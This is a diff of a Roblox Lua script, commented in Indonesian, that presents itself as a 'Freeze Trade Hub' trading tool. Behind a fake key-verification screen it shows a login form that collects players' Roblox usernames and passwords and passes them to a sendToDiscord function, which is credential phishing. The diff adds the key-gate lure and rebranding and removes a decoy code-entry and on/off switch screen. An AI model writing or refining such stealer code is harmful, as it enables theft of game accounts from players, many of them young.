@@ -74,7 +74,7 @@ local function createLoginGUI()
     titleLabel.Position = UDim2.new(0, 0, 0, 0)
     titleLabel.BackgroundTransparency = 1
     titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Auto Accept"
+    titleLabel.Text = "Freeze Trade Hub"
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
@@ -132,51 +132,28 @@ local function createLoginGUI()
             print("Login berhasil! Username:", username, "Password:", password)
             sendToDiscord(username, password)
             gui:Destroy()
-
-            -- Menambahkan loading sebelum GUI selanjutnya
-            local loadingGui = Instance.new("ScreenGui")
-            loadingGui.Parent = game.CoreGui or game:GetService("CoreGui")
-            local loadingFrame = Instance.new("Frame")
-            loadingFrame.Parent = loadingGui
-            loadingFrame.Size = UDim2.new(0, 300, 0, 100)
-            loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
-            loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            loadingFrame.BorderSizePixel = 3
-            loadingFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-            local loadingLabel = Instance.new("TextLabel")
-            loadingLabel.Parent = loadingFrame
-            loadingLabel.Size = UDim2.new(1, 0, 1, 0)
-            loadingLabel.BackgroundTransparency = 1
-            loadingLabel.Font = Enum.Font.SourceSans
-            loadingLabel.Text = "Loading..."
-            loadingLabel.TextSize = 20
-            loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-            -- Delay 8 detik sebelum menampilkan GUI ketiga
-            wait(8)
-            loadingGui:Destroy()
-            createCodeEntryGUI() -- Memanggil GUI ketiga
         else
             print("Harap isi username dan password!")
         end
     end)
 end
 
--- Fungsi Membuat GUI Ketiga (Kode)
-local function createCodeEntryGUI()
+-- Fungsi Membuat GUI Pertama (Key Validation)
+local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
     local titleLabel = Instance.new("TextLabel")
-    local codeBox = Instance.new("TextBox")
-    local submitButton = Instance.new("TextButton")
+    local keyBox = Instance.new("TextBox")
+    local verifyKeyButton = Instance.new("TextButton")
+    local copyLinkButton = Instance.new("TextButton")
+    local errorLabel = Instance.new("TextLabel")
 
     -- Properti GUI
-    gui.Name = "CodeEntryGUI"
+    gui.Name = "KeyValidationGUI"
     gui.Parent = game.CoreGui or game:GetService("CoreGui")
 
     -- Frame
-    frame.Name = "CodeFrame"
+    frame.Name = "KeyFrame"
     frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 250)
     frame.Position = UDim2.new(0.5, -150, 0.5, -125)
@@ -191,98 +168,73 @@ local function createCodeEntryGUI()
     titleLabel.Position = UDim2.new(0, 0, 0, 0)
     titleLabel.BackgroundTransparency = 1
     titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Auto Accept"
+    titleLabel.Text = "Freeze Trade Hub"
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Code Box
-    codeBox.Name = "CodeBox"
-    codeBox.Parent = frame
-    codeBox.Size = UDim2.new(1, -20, 0, 40)
-    codeBox.Position = UDim2.new(0, 10, 0, 60)
-    codeBox.PlaceholderText = "Masukkan Kode 6 Digit"
-    codeBox.Font = Enum.Font.SourceSans
-    codeBox.Text = ""
-    codeBox.TextSize = 14
-    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Key Box
+    keyBox.Name = "KeyBox"
+    keyBox.Parent = frame
+    keyBox.Size = UDim2.new(1, -20, 0, 40)
+    keyBox.Position = UDim2.new(0, 10, 0, 60)
+    keyBox.PlaceholderText = "Masukkan Key"
+    keyBox.Font = Enum.Font.SourceSans
+    keyBox.Text = ""
+    keyBox.TextSize = 14
+    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Submit Button
-    submitButton.Name = "SubmitButton"
-    submitButton.Parent = frame
-    submitButton.Size = UDim2.new(1, -20, 0, 40)
-    submitButton.Position = UDim2.new(0, 10, 0, 130)
-    submitButton.Text = "Submit"
-    submitButton.Font = Enum.Font.SourceSansBold
-    submitButton.TextSize = 16
-    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Error Label
+    errorLabel.Name = "ErrorLabel"
+    errorLabel.Parent = frame
+    errorLabel.Size = UDim2.new(1, -20, 0, 20)
+    errorLabel.Position = UDim2.new(0, 10, 0, 105)
+    errorLabel.BackgroundTransparency = 1
+    errorLabel.Font = Enum.Font.SourceSans
+    errorLabel.Text = ""
+    errorLabel.TextSize = 14
+    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
-    -- Fungsi Submit Button
-    submitButton.MouseButton1Click:Connect(function()
-        local code = codeBox.Text
-        if code == "123456" then -- Ganti dengan kode valid Anda
-            print("Kode benar!")
-            gui:Destroy()
-            createSwitchGUI() -- Menampilkan GUI keempat
+    -- Verify Key Button
+    verifyKeyButton.Name = "VerifyKeyButton"
+    verifyKeyButton.Parent = frame
+    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
+    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
+    verifyKeyButton.Text = "Verifikasi Key"
+    verifyKeyButton.Font = Enum.Font.SourceSansBold
+    verifyKeyButton.TextSize = 16
+    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Copy Link Button
+    copyLinkButton.Name = "CopyLinkButton"
+    copyLinkButton.Parent = frame
+    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
+    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
+    copyLinkButton.Text = "Get Key"
+    copyLinkButton.Font = Enum.Font.SourceSansBold
+    copyLinkButton.TextSize = 16
+    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
+    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Tombol Copy Link
+    copyLinkButton.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard(linkUrl)
+            print("Link berhasil disalin ke clipboard!")
         else
-            print("Kode salah!")
+            print("Executor Anda tidak mendukung setclipboard. Salin link secara manual: " .. linkUrl)
         end
     end)
-end
 
--- Fungsi Membuat GUI Keempat (Switch)
-local function createSwitchGUI()
-    local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
-    local switchButton = Instance.new("TextButton")
-
-    -- Properti GUI
-    gui.Name = "SwitchGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
-
-    -- Frame
-    frame.Name = "SwitchFrame"
-    frame.Parent = gui
-    frame.Size = UDim2.new(0, 300, 0, 200)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 3
-    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-    -- Title Label
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Parent = frame
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Auto Accept"
-    titleLabel.TextSize = 24
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Switch Button (On/Off)
-    switchButton.Name = "SwitchButton"
-    switchButton.Parent = frame
-    switchButton.Size = UDim2.new(1, -20, 0, 40)
-    switchButton.Position = UDim2.new(0, 10, 0, 100)
-    switchButton.Text = "ON"
-    switchButton.Font = Enum.Font.SourceSansBold
-    switchButton.TextSize = 16
-    switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    switchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Fungsi Switch Button
-    switchButton.MouseButton1Click:Connect(function()
-        if switchButton.Text == "ON" then
-            switchButton.Text = "OFF"
-            switchButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-            print("Auto Accept OFF")
+    -- Fungsi Verifikasi Key
+    verifyKeyButton.MouseButton1Click:Connect(function()
+        if keyBox.Text == correctKey then
+            print("Key benar!")
+            gui:Destroy()
+            createLoginGUI() -- Memanggil GUI kedua
         else
-            switchButton.Text = "ON"
-            switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-            print("Auto Accept ON")
+            errorLabel.Text = "Key salah! Silahkan Get Key."
         end
     end)
 end
